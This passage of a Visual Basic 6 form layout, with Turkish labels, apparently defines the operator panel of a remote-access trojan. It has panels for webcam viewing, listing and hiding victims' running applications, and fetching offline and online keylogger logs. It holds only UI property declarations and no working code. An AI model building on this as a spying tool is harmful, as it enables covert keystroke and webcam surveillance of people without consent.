         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4832A
         PICN            =   "Form1.frx":48644
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Image webcamgoruntu 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   4695
         Left            =   120
         Stretch         =   -1  'True
         Top             =   360
         Width           =   5895
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Web Cam Görüntüsü"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   18
         Left            =   0
         TabIndex        =   114
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   10
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   98
      Top             =   3240
      Width           =   6735
      Begin VB.TextBox txtappset 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   120
         TabIndex        =   109
         Text            =   "biodox was here"
         Top             =   4770
         Width           =   5895
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   44
         Left            =   6120
         TabIndex        =   99
         ToolTipText     =   "uygulama listesini yenile"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":48996
         PICN            =   "Form1.frx":48CB0
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4335
         Index           =   6
         Left            =   120
         TabIndex        =   100
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   7646
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   2293
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Handle"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Placement"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "PID"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Text            =   "Class"
            Object.Width           =   1852
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   45
         Left            =   6120
         TabIndex        =   101
         ToolTipText     =   "bütün uygulamalarý göster"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":491EE
         PICN            =   "Form1.frx":49508
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   46
         Left            =   6120
         TabIndex        =   102
         ToolTipText     =   "seçili uygulamayý tam ekran yap"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":49A46
         PICN            =   "Form1.frx":49D60
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   47
         Left            =   6120
         TabIndex        =   103
         ToolTipText     =   "seçili uygulamayý simge durumuna küçült"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4A39A
         PICN            =   "Form1.frx":4A6B4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   48
         Left            =   6120
         TabIndex        =   104
         ToolTipText     =   "seçili uygulamayý göster"
         Top             =   3360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4A8E6
         PICN            =   "Form1.frx":4AC00
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   49
         Left            =   6120
         TabIndex        =   105
         ToolTipText     =   "seçili uygulamayý gizle"
         Top             =   2760
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4B23A
         PICN            =   "Form1.frx":4B554
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   50
         Left            =   6120
         TabIndex        =   106
         ToolTipText     =   "seçili uygulamayý kapat"
         Top             =   3960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4BB8E
         PICN            =   "Form1.frx":4BEA8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   51
         Left            =   6120
         TabIndex        =   107
         ToolTipText     =   "seçili uygulamanýn baþlýðýný deðiþtir"
         Top             =   4560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4C36E
         PICN            =   "Form1.frx":4C688
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Uygulama Ayarlarý"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   20
         Left            =   0
         TabIndex        =   108
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   9
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   82
      Top             =   2880
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   31
         Left            =   6120
         TabIndex        =   83
         ToolTipText     =   "Listeyi Yenile"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4CCC2
         PICN            =   "Form1.frx":4CFDC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   5
         Left            =   120
         TabIndex        =   85
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   2293
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "PID"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Path"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Memory Usage"
            Object.Width           =   1852
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Text            =   "Priority"
            Object.Width           =   1852
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   32
         Left            =   6120
         TabIndex        =   86
         ToolTipText     =   "uygulama listesini temizle"
         Top             =   4560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4D51A
         PICN            =   "Form1.frx":4D834
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   38
         Left            =   6120
         TabIndex        =   92
         ToolTipText     =   "programý kapat"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4DBB6
         PICN            =   "Form1.frx":4DED0
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   39
         Left            =   6120
         TabIndex        =   93
         ToolTipText     =   "iþlem modülü"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4E0D2
         PICN            =   "Form1.frx":4E3EC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   40
         Left            =   6120
         TabIndex        =   94
         ToolTipText     =   "Priority Normal olarak ayarla"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4E7FE
         PICN            =   "Form1.frx":4EB18
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   41
         Left            =   6120
         TabIndex        =   95
         ToolTipText     =   "Priority hazir olarak ayarla"
         Top             =   2760
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4F152
         PICN            =   "Form1.frx":4F46C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   42
         Left            =   6120
         TabIndex        =   96
         ToolTipText     =   "Priority yüksek olarak ayarla"
         Top             =   3360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":4FB36
         PICN            =   "Form1.frx":4FE50
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   43
         Left            =   6120
         TabIndex        =   97
         ToolTipText     =   "Priority gerçek zamanlý ayarla"
         Top             =   3960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":504D2
         PICN            =   "Form1.frx":507EC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Çalýþan Uygulamalar"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   4
         Left            =   0
         TabIndex        =   84
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   8
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   76
      Top             =   2520
      Width           =   6735
      Begin VB.TextBox txtoffline 
         Appearance      =   0  'Flat
         Height          =   4695
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   77
         Top             =   360
         Width           =   5895
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   28
         Left            =   6120
         TabIndex        =   78
         ToolTipText     =   "offline keylogger log kayitlarini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":50E6E
         PICN            =   "Form1.frx":51188
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   29
         Left            =   6120
         TabIndex        =   79
         ToolTipText     =   "loglari kaydet"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":51CD2
         PICN            =   "Form1.frx":51FEC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   30
         Left            =   6120
         TabIndex        =   80
         ToolTipText     =   "log kayitlarini temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5233E
         PICN            =   "Form1.frx":52658
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Offline Keylogger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   3
         Left            =   0
         TabIndex        =   81
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   7
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   69
      Top             =   2160
      Width           =   6735
      Begin VB.TextBox txtonline 
         Appearance      =   0  'Flat
         Height          =   4695
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   74
         Top             =   360
         Width           =   5895
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   24
         Left            =   6120
         TabIndex        =   70
         ToolTipText     =   "online keyloggeri aç"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":52902
         PICN            =   "Form1.frx":52C1C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   25
